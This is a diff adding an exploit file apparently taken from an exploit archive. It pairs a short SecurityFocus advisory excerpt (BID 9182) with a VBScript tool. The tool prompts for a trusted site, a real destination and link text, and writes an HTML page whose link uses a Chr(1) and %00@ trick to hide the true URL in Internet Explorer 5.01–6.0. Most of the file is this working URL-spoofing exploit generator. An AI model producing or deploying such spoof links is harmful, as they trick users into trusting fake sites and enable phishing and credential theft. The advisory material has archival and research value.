@@ -1,0 +1,51 @@
+source: http://www.securityfocus.com/bid/9182/info
+
+A weakness has been reported in multiple browsers that may allow attackers to obfuscate the URI for a visited page. The problem is said to occur when a URI designed to pass access a specific location with a supplied username, contains a hexadecimal 1 value prior to the @ symbol.
+
+An attacker could exploit this issue by supplying a malicious URI pointing to a page designed to mimic that of a trusted site, and tricking a victim who follows a link into believing they are actually at the trusted location.
+
+On Error Resume Next
+
+PromtStart = "Do you want to create a web page to exploit Internet Explorer 5.01, 5.5 and 6.0 on Windows" _
+& " platforms?" & vbcrlf & "(URL Obfuscation - http://www.securityfocus.com/bid/9182)"
+
+Ok2Run = MsgBox (PromtStart,vbyesno + vbquestion,"URL Obfuscation Web Page Creator")
+
+If Ok2Run = vbyes Then
+	Do While strFileName = ""
+		strFileName = InputBox ("Enter the name of the web page file you want to create","File Name","TEST.HTML")
+	Loop
+	Do While strSpoofSite = ""
+		strSpoofSite = InputBox ("Enter the name of the site you want users to THINK they're going to:","Spoof Site","atkins.com")
+	Loop
+	Do While strRealSite = ""
+		strRealSite = InputBox ("Enter the name of the site users WILL go to when they click on the link:","Real Site","www.mcdonalds.com")
+	Loop
+	Do While strLinkText = ""
+		strLinkText = InputBox ("Enter the text you want to appear in the link:","Link Text","Go to the Atkins Site")
+	Loop
+	Err.Clear
+	CreateExploitPage strFileName, strSpoofSite, strRealSite, strLinkText
+	If Err.Number = 0 then
+		MsgBox "Your exploit page has been saved to C:\" & strFileName & ".",vbokonly + vbinformation, "Script Complete"
+	Else
+		MsgBox "An error occured (" & Err.Description & ")saving your exploit page to C:\" & strFileName & ".",vbokonly + vbcritical, "Script Error"
+		Err.Clear 
+	End if
+Else
+	MsgBox "Script canceled.",vbokonly + vbcritical,"URL Obfuscation Web Page Creator"
+End If
+
+Sub CreateExploitPage(strFileName, strSpoofSite, strRealSite, strLinkText)
+	Set fs = CreateObject("Scripting.FileSystemObject") 
+	Set a = fs.CreateTextFile("c:\" & strFileName, True) 
+	a.WriteLine("<HTML>") 
+	a.WriteLine("<TITLE>Exploit Page for BID 9182 (http://www.securityfocus.com/bid/9182)</TITLE>")
+	a.WriteLine("<BODY>")
+	strExploitLine = "<A HREF=" & Chr(34) & "http://" & strSpoofSite & Chr(1) & "%00@" & strRealSite 
+	strExploitLine = strExploitLine & Chr(34) & ">" & strLinkText & "</A>"
+	a.WriteLine(strExploitLine)
+	a.WriteLine("</BODY>")
+	a.WriteLine("</HTML>")
+	a.Close 
+End Sub
